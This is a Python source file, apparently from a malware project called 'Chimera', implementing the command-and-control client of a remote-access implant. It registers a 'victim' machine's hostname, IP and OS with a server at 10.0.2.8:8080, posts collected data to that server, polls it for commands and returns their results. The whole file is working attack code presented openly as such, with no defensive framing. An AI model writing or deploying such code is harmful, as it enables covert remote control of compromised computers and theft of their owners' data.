"""
Chimera - C2 Client
Handles communication with C2 server
"""
import requests
import json
import time
import socket
import platform
import threading

class C2Client:
    def __init__(self, server_url="http://10.0.2.8:8080"):
        self.server_url = server_url
        self.victim_id = None
        self.running = False
        self.callbacks = {}
    
    def set_victim_id(self, victim_id):
        """Set victim ID"""
        self.victim_id = victim_id
    
    def start(self):
        """Start the client"""
        self.running = True
    
    def stop(self):
        """Stop the client"""
        self.running = False
    
    def send_data(self, data_type, content):
        """Send data to C2"""
        if not self.victim_id:
            return False
        
        payload = {
            "victim_id": self.victim_id,
            "type": data_type,
            "content": content
        }
        
        try:
            response = requests.post(
                f"{self.server_url}/api/collect",
                json=payload,
                timeout=10
            )
            return response.status_code == 200
        except:
            return False
    
    def register(self, info):
        """Register with C2"""
        if not self.victim_id:
            return False
        
        payload = {
            "victim_id": self.victim_id,
            "hostname": info.get("hostname", "Unknown"),
            "ip": info.get("ip", "Unknown"),
            "os": info.get("os", "Unknown"),
            "os_version": info.get("os_version", "Unknown"),
            "architecture": info.get("architecture", "Unknown")
        }
        
        try:
            response = requests.post(
                f"{self.server_url}/api/register",
                json=payload,
                timeout=10
            )
            return response.status_code == 200
        except:
            return False
    
    def get_command(self):
        """Get pending command from C2"""
        if not self.victim_id:
            return None
        
        payload = {"victim_id": self.victim_id}
        
        try:
            response = requests.post(
                f"{self.server_url}/api/get_command",
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get("has_command"):
                    return {
                        "command": data.get("command"),
                        "command_id": data.get("command_id")
                    }
            return None
        except:
            return None
    
    def send_command_result(self, command_id, result):
        """Send command execution result"""
        if not self.victim_id:
            return False
        
        payload = {
            "victim_id": self.victim_id,
            "command_id": command_id,
            "result": result
        }
        
        try:
            response = requests.post(
                f"{self.server_url}/api/command_result",
                json=payload,
                timeout=10
            )
            return response.status_code == 200
        except:
            return False
